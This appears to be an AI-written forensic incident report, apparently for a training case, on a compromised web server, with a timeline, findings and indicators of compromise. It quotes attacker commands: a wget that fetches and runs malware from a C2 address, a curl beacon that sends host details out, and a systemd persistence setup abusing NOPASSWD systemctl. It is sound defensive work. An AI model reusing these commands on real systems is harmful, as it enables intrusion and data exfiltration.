All 10 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised. The attacker gained initial access through the **www-data** web service account, downloaded and executed malware from C2 server **185.229.59.103**, then laterally moved to the **deploy** account via a compromised SSH key. Using deploy's overly-permissive NOPASSWD sudo access to `systemctl`, the attacker installed a persistent systemd beacon service that phones home to the C2 every 10 minutes. The attacker's session lasted approximately 3 minutes in the early morning of April 14.

---

## Shell History Analysis

Four accounts' shell histories were examined:

| Account | History File | Size | Commands | Findings |
|---------|-------------|------|----------|----------|
| **root** | `fs/root/.bash_history` | 80 B | 4 | Routine admin (apt update/upgrade, restart nginx, tail logs). No suspicious activity. |
| **deploy** | `fs/home/deploy/.bash_history` | 264 B | 15 | Routine CI/CD commands (git, npm, docker). **Missing** all attacker commands visible in auth.log — evidence of history tampering. |
| **alice** | `fs/home/alice/.bash_history` | 123 B | 6 | Routine troubleshooting (ls, cd /var/log, tail access.log, journalctl). No suspicious activity. |
| **www-data** | `fs/var/www/.bash_history` | 103 B | 7 | **Attacker activity**: recon, malware download from C2, execution, credential access. |

**Note:** The **bob** account (UID 1003) has two login sessions in auth.log but **no** `.bash_history` file was found in the filesystem snapshot.

---

## Attack Timeline

| Time | Actor | Event | Evidence |
|------|-------|-------|----------|
| (pre-log) | www-data | Recon: `id`, `uname -a` | fs/var/www/.bash_history:1-2 |
| (pre-log) | www-data | Downloaded malware: `wget http://185.229.59.103/u -O /tmp/.u` | fs/var/www/.bash_history:4 |
| (pre-log) | www-data | Executed payload: `chmod +x /tmp/.u; /tmp/.u &` | fs/var/www/.bash_history:5-6 |
| (pre-log) | www-data | Read /etc/passwd | fs/var/www/.bash_history:7 |
| Apr 14 03:17:44 | deploy (from 185.229.59.103) | SSH login via publickey (compromised key) | auth.log:30 |
| Apr 14 03:18:02 | deploy→root | `sudo cat /etc/passwd` (recon) | auth.log:32 |
| Apr 14 03:18:12 | deploy→root | `sudo cp /tmp/update /usr/local/bin/update` | auth.log:35 |
| Apr 14 03:18:17 | deploy→root | `sudo chmod +x /usr/local/bin/update` | auth.log:36 |
| Apr 14 03:18:29 | deploy→root | `sudo tee /etc/systemd/system/system-updater.service` | auth.log:37 |
| Apr 14 03:18:44 | deploy→root | `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | deploy→root | `sudo systemctl enable system-updater.service` | auth.log:39 |
| Apr 14 03:19:03 | deploy→root | `sudo systemctl start system-updater.service` | auth.log:40 |
| Apr 14 03:20:51 | deploy | SSH session closed | auth.log:41 |

---

## Key Findings

### 1. Malicious Persistence — system-updater.service [CONFIRMED]
A systemd unit at `etc/systemd/system/system-updater.service` runs as root and executes:
```
/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
```
It restarts every 600 seconds (10 minutes) and is enabled for boot persistence via `multi-user.target`.

### 2. C2 Server — 185.229.59.103 [CONFIRMED]
Threat intelligence confirms this IP as a **C2 server** (tags: c2, beacon; confidence: high). It appears in both the www-data malware download (`http://185.229.59.103/u`) and the beacon service destination (`https://185.229.59.103:8443/beacon`), as well as the attacker's SSH login source.

### 3. Compromised deploy SSH Key [CONFIRMED]
The attacker logged in as **deploy** from C2 IP 185.229.59.103 using the same RSA key fingerprint (`SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ`) used by legitimate CI/CD sessions from 10.0.1.50. This was the only login from an external IP in the log.

### 4. www-data Attack Chain [CONFIRMED]
The www-data bash history records classic post-exploitation: system recon → malware staging in /tmp → execution → credential harvesting. The timestamps are absent (no HISTTIMEFORMAT), but the activity predates the deploy compromise.

### 5. History Tampering [INFERENCE]
The deploy account's bash history contains only routine CI/CD commands and is entirely missing the 8 sudo commands the auth.log records during the Apr 14 03:17–03:20 session. The attacker likely ran `unset HISTFILE` or equivalent.

### 6. Overly Permissive Sudoers [INFERENCE]
The file `etc/sudoers.d/deploy` grants `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl` without restricting subcommands. This allowed the attacker to `daemon-reload`, `enable`, and `start` a rogue service — a known privilege escalation vector.

---

## Indicators of Compromise

| Type | Value | Context |
|------|-------|---------|
| IP | **185.229.59.103** | C2 server — SSH login source, malware host, beacon destination |
| URL | `http://185.229.59.103/u` | Malware download URL |
| URL | `https://185.229.59.103:8443/beacon` | Beacon callback endpoint |
| File | `/usr/local/bin/update` | Dropped binary (copied from /tmp/update) |
| File | `/tmp/.u` | Staged malware (downloaded by www-data) |
| Service | `system-updater.service` | Persistent beacon service |
| SSH Key | `RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ` | Compromised deploy key |

---

## Case Questions

**Case Q1:** Shell histories were analyzed for four accounts: **root**, **deploy**, **alice**, and **www-data**. A fifth account, **bob**, had login sessions in auth.log but no `.bash_history` file was present in the filesystem snapshot.

**Case Q2:** Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`) shows what the attacker did: system reconnaissance (`id`, `uname -a`), malware download from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), making it executable (`chmod +x /tmp/.u`), executing it in the background (`/tmp/.u &`), and reading `/etc/passwd`. Additionally, while the **deploy** account's bash history was tampered with (attacker commands missing), the **auth.log sudo records** (lines 32–40) reveal the attacker's actions through the deploy account: reading `/etc/passwd`, copying a binary to `/usr/local/bin/update`, installing and enabling the malicious `system-updater.service` beacon, and starting it.